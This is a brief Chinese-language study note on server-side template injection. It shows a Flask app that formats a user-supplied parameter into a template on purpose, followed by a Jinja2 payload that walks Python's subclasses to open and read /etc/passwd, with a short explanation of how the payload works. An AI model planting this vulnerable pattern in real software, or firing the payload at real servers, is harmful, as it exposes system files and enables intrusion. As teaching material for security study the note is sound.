# SSTI

## 模板注入

## !/usr/bin/env python3

```text
from flask import Flask, request, abort, render_template_string
import os.path

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    name = request.args.get('name')
    if name is not None:
        return render_template_string(open('templates/hello.html').read().format(name=name))

    return render_template_string(open('templates/index.html').read())

if __name__ == "__main__":
    app.run(host="0.0.0.0")
```

`{{''.__class__.__base__.__subclasses__()[40]('/etc/passwd', 'r').read()}}`

随便一个类,**base**找到基类，然后subclasses即可看到这个pyhton里面有哪些类，选取第四十个是**file**，然后即可初始化一个文件，并且读

